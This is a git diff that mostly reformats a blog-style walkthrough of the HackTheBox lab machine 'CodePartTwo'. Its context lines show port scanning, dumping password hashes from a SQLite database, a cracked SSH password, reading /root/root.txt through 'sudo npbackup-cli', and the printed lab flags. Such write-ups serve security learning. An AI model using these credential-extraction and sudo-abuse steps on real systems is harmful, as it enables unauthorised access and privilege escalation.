@@ -1,10 +1,22 @@
 ---
-title: "CodePartTwo"
-date: "2025-08-27"
+title: 'CodePartTwo (HackTheBox) — Step-by-Step Walkthrough'
+date: '2025-08-27'
 draft: false
-tags: ["linux", "javascript", "js2py", "cve-2024-28397", "sandbox-escape", "reverse-shell", "privilege-escalation", "Easy" , "HackTheBox" , "Machine"]
-summary: "Compromise of a Linux HackTheBox machine via a js2py sandbox escape (CVE-2024-28397) in a web-based JavaScript editor to gain a shell, followed by credential extraction from a SQLite database and privilege escalation by abusing sudo npbackup-cli to read the root flag."
-images: ["/static/images/codetwo/preview.png"]
+tags:
+  [
+    'linux',
+    'javascript',
+    'js2py',
+    'cve-2024-28397',
+    'sandbox-escape',
+    'reverse-shell',
+    'privilege-escalation',
+    'Easy',
+    'HackTheBox',
+    'Machine',
+  ]
+summary: 'Compromise of a Linux HackTheBox machine via a js2py sandbox escape (CVE-2024-28397) in a web-based JavaScript editor to gain a shell, followed by credential extraction from a SQLite database and privilege escalation by abusing sudo npbackup-cli to read the root flag.'
+images: ['/static/images/codetwo/preview.png']
 ---
 
 # CodePartTwo Machine (HackTheBox) — Step-by-Step Walkthrough
@@ -12,17 +24,18 @@ images: ["/static/images/codetwo/preview.png"]
 ![CodeTwo](/static/images/codetwo/result.png)
 
 ---
+
 # Machine info:
 
-| IP Address | Difficulty | Points | Operating System |
-| --- | --- | --- | --- |
-| 10.10.11.82 | Easy | 20 | Linux |
+| IP Address  | Difficulty | Points | Operating System |
+| ----------- | ---------- | ------ | ---------------- |
+| 10.10.11.82 | Easy       | 20     | Linux            |
 
 # Pinging:
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/HackThBox/CodeTwo]
-└─$ ping 10.10.11.82  
+└─$ ping 10.10.11.82
 PING 10.10.11.82 (10.10.11.82) 56(84) bytes of data.
 64 bytes from 10.10.11.82: icmp_seq=1 ttl=63 time=114 ms
 64 bytes from 10.10.11.82: icmp_seq=2 ttl=63 time=103 ms
@@ -33,7 +46,7 @@ PING 10.10.11.82 (10.10.11.82) 56(84) bytes of data.
 rtt min/avg/max/mdev = 103.181/111.464/117.067/5.977 ms
 ```
 
-The target machine is inside my **`local network`**,  now I can move forward with **network scanning** to discover  services, or open ports in the same network.
+The target machine is inside my **`local network`**, now I can move forward with **network scanning** to discover services, or open ports in the same network.
 
 After scanning, I can continue with **`enumeration`** (collecting detailed information about the system and services) and then attempt **`privilege escalation`** to gain full **`root access**`
 
@@ -41,14 +54,14 @@ After scanning, I can continue with **`enumeration`** (collecting detailed infor
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/HackThBox/CodeTwo]
-└─$ nmap -sCV --open -oA CodeTwo 10.10.11.82                                  
+└─$ nmap -sCV --open -oA CodeTwo 10.10.11.82
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 04:25 EDT
 Nmap scan report for 10.10.11.82
 Host is up (0.30s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT     STATE SERVICE    VERSION
 22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
 |   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
 |_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
@@ -82,7 +95,7 @@ So, I created a new account by registering, and then logged in to see how the ap
 
 ![CodeTwo](/static/images/codetwo/image%202.png)
 
-After logging in, I was presented with a **code editor interface**, very similar to the one from the previous **`HackTheBox`** machine *“Code”*.
+After logging in, I was presented with a **code editor interface**, very similar to the one from the previous **`HackTheBox`** machine _“Code”_.
 
 [Code-HackThBox](https://app.hackthebox.com/machines/Code)
 
@@ -104,32 +117,32 @@ Inside the code, particularly in **`app.py`**, I noticed it was using the **`js2
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/HackThBox/CodeTwo]
-└─$ mv ~/Downloads/app.zip .                       
-                                                                                                                                                              
+└─$ mv ~/Downloads/app.zip .
+
 ┌──(kali㉿kali)-[~/Desktop/HackThBox/CodeTwo]
-└─$ ls app.zip 
+└─$ ls app.zip
 app.zip
-                                                                                                                                                              
+
 ┌──(kali㉿kali)-[~/Desktop/HackThBox/CodeTwo]
-└─$ unzip app.zip                          
+└─$ unzip app.zip
 Archive:  app.zip
    creating: app/
    creating: app/templates/
-  inflating: app/templates/login.html  
-  inflating: app/templates/dashboard.html  
-  inflating: app/templates/reviews.html  
-  inflating: app/templates/register.html  
-  inflating: app/templates/index.html  
-  inflating: app/templates/base.html  
-  inflating: app/requirements.txt    
+  inflating: app/templates/login.html
+  inflating: app/templates/dashboard.html
+  inflating: app/templates/reviews.html
+  inflating: app/templates/register.html
+  inflating: app/templates/index.html
+  inflating: app/templates/base.html
+  inflating: app/requirements.txt
    creating: app/static/
    creating: app/static/js/
-  inflating: app/static/js/script.js  
+  inflating: app/static/js/script.js
    creating: app/static/css/
-  inflating: app/static/css/styles.css  
-  inflating: app/app.py              
+  inflating: app/static/css/styles.css
+  inflating: app/app.py
    creating: app/instance/
-  inflating: app/instance/users.db   
+  inflating: app/instance/users.db
 ```
 
 ![CodeTwo](/static/images/codetwo/image%204.png)
@@ -193,7 +206,7 @@ To progress, I need to **migrate to another user** with more privileges or usefu
 While exploring the system, I found a **home directory for a user named `marco`**, which could be the next target.
 
 ```bash
-app@codetwo:~/app/instance$ cd 
+app@codetwo:~/app/instance$ cd
 app@codetwo:~$ cd ..
 app@codetwo:/home$ ls
 app  marco
@@ -213,11 +226,11 @@ I then checked this database file to see if it contained any **`user information
 app@codetwo:~/app$ cd instance/
 app@codetwo:~/app/instance$ ls
 users.db
-app@codetwo:~/app/instance$ sqlite3 users.db 
+app@codetwo:~/app/instance$ sqlite3 users.db
 SQLite version 3.31.1 2020-01-27 19:55:54
 Enter ".help" for usage hints.
 sqlite> .tables
-code_snippet  user        
+code_snippet  user
 sqlite> SELECT * FROM user;
 1|marco|649c9d65a206a75f5abe509fe128bce5
 2|app|a97588c0e2fa3a024876339e27aeb42e
@@ -236,9 +249,9 @@ password : **`sweetangelbabylove`**
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/HackThBox/CodeTwo/app]
 └─$ ssh marco@10.10.11.82
-marco@10.10.11.82's password: 
+marco@10.10.11.82's password:
 Permission denied, please try again.
-marco@10.10.11.82's password: 
+marco@10.10.11.82's password:
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -268,7 +281,7 @@ To check for new updates run: sudo apt update
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
 Last login: Wed Aug 27 19:00:47 2025 from 10.10.16.80
-marco@codetwo:~$ 
+marco@codetwo:~$
 ```
 
 ## User Flag:
@@ -276,12 +289,12 @@ marco@codetwo:~$
 ```bash
 marco@codetwo:~$ ls
 backups  npbackup.conf  user.txt
-marco@codetwo:~$ cat user.txt 
+marco@codetwo:~$ cat user.txt
 ab17d77653f9d09b9c693554b26eaa4b
-marco@codetwo:~$ 
+marco@codetwo:~$
 ```
 
-User Flag : **`ab17d77653f9d09b9c693554b26eaa4b`** 
+User Flag : **`ab17d77653f9d09b9c693554b26eaa4b`**
 
 ## Root Flag:
 
@@ -325,7 +338,7 @@ marco@codetwo:~$ sudo npbackup-cli -c my.conf -b -f
 2025-08-27 19:18:49,235 :: INFO :: ExecTime = 0:00:00.030166, finished, state is: critical.
 marco@codetwo:~$ sudo npbackup-cli -c my.conf -f --dump /root/root.txt
 4aff940b07fccd30e5972c5ba9075f6a
-marco@codetwo:~$ 
+marco@codetwo:~$
 ```
 
 Root Flag : **`4aff940b07fccd30e5972c5ba9075f6a`**
